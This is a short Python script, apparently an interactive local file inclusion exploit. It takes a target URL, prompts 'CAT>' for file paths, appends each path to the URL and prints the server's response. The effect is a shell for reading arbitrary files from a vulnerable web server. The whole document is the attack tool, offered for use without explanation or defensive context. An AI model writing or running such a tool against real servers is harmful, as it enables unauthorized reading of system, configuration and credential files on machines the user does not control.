#!/usr/bin/env python3

import requests
import sys
import os

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def send_request(url, command):
    full_url = f'{url}/{command}'
    response = requests.get(full_url)
    return response.text

def exploit_lfi(url):
    while True:
        command = input('CAT> ')
        if command.lower() == 'exit':
            break
        elif command.lower() == 'clear':
            os.system('clear')
            continue
        response = send_request(url, command)
        print(response)

if __name__ == '__main__':
    clear_screen()
    url = sys.argv[1]
    exploit_lfi(url)
